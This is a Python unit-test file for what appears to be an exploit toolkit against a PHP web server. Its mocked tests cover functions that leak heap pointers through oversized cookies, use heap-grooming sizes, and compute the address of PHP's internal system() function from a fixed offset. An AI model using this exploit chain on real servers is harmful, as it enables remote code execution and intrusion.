#!/usr/bin/env python3
import os
import sys
import struct
import unittest
from unittest.mock import MagicMock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from leak.cookie_leak import leak_cookie, parse_cookie as parse_cookie_cookie
from leak.heap_base import leak_heap_base, parse_cookie as parse_cookie_heap
from leak.ptr_leak import leak_ptr, parse_cookie as parse_cookie_ptr, calc_zif_system, ZIF_SYSTEM_DELTA


class FakeResp:
    def __init__(self, text="", headers=None, cookies=None, content=None, raw_cookie=None):
        self.text = text
        self.headers = headers or {}
        self.cookies = cookies or []
        self.content = content if content is not None else b""
        self.raw_cookie = raw_cookie
        self.status_code = 200


class FakeSession:
    def __init__(self, resp):
        self._resp = resp
        self.calls = []

    def request(self, method, url, **kwargs):
        self.calls.append((method, url, kwargs))
        return self._resp

    def post(self, url, **kwargs):
        self.calls.append(("POST", url, kwargs))
        return self._resp

    def get(self, url, **kwargs):
        return self._resp


class TestCookieLeak(unittest.TestCase):
    def test_leak_cookie_returns_tuple(self):
        cookie = b"\x00" * 4000
        resp = FakeResp(raw_cookie=cookie)
        session = FakeSession(resp)
        c, ptrs = leak_cookie("http://127.0.0.1:8080/", session)
        self.assertEqual(c, cookie)
        self.assertEqual(len(ptrs), 4000 // 8)

    def test_leak_cookie_parses_set_cookie(self):
        cookie = (b"\x7f" + b"\x00" * 7) * (4000 // 8)
        from urllib.parse import quote
        encoded = cookie  # raw_cookie path easier
        resp = FakeResp(raw_cookie=encoded)
        session = FakeSession(resp)
        c, ptrs = leak_cookie("http://127.0.0.1:8080/", session, warmup_done=True)
        self.assertEqual(len(c), 4000)
        self.assertTrue(any(p != 0 for p in ptrs))

    def test_leak_cookie_warmup_done_false_calls_warmup(self):
        cookie = b"\x00" * 4000
        resp = FakeResp(raw_cookie=cookie)
        session = FakeSession(resp)
        # patch warmup_heap in module
        import leak.cookie_leak as cl
        cl.warmup_heap = lambda *a, **k: None
        c, ptrs = leak_cookie("http://127.0.0.1:8080/", session, warmup_done=False)
        self.assertEqual(len(c), 4000)


class TestHeapBaseLeak(unittest.TestCase):
    def test_leak_heap_base_returns_address_and_cookie(self):
        ptr = 0x7f1234567890
        cookie = struct.pack("<Q", ptr) + b"\x00" * (256 - 8)
        resp = FakeResp(raw_cookie=cookie)
        session = FakeSession(resp)
        addr, raw = leak_heap_base("http://127.0.0.1:8080/", session, producer_size=249 * 1024)
        self.assertEqual(raw, cookie)
        self.assertEqual(addr, ptr)

    def test_leak_heap_base_content_fallback(self):
        ptr = 0x7fabcddcba98
        cookie = struct.pack("<Q", ptr) + b"\x00" * (256 - 8)
        resp = FakeResp(content=cookie)
        session = FakeSession(resp)
        addr, raw = leak_heap_base("http://127.0.0.1:8080/", session)
        self.assertEqual(len(raw), 256)
        self.assertEqual(addr, ptr)


class TestPtrLeak(unittest.TestCase):
    def test_leak_ptr_returns_ptr_and_cookie(self):
        ptr = 0x7f9999999999
        cookie = struct.pack("<Q", ptr) + b"\x00" * (16 - 8)
        resp = FakeResp(raw_cookie=cookie)
        session = FakeSession(resp)
        addr, raw = leak_ptr("http://127.0.0.1:8080/", session, producer_size=251 * 1024)
        self.assertEqual(raw, cookie)
        self.assertEqual(addr, ptr)

    def test_calc_zif_system(self):
        ptr = 0x7f9999999999
        self.assertEqual(calc_zif_system(ptr), ptr - ZIF_SYSTEM_DELTA)
        self.assertEqual(ZIF_SYSTEM_DELTA, 0x204BC0)

    def test_leak_ptr_calculates_zif_system(self):
        ptr = 0x7f9999999999
        cookie = struct.pack("<Q", ptr) + b"\x00" * (16 - 8)
        resp = FakeResp(raw_cookie=cookie)
        session = FakeSession(resp)
        addr, raw = leak_ptr("http://127.0.0.1:8080/", session)
        self.assertEqual(addr - 0x204BC0, calc_zif_system(ptr))


if __name__ == "__main__":
    unittest.main()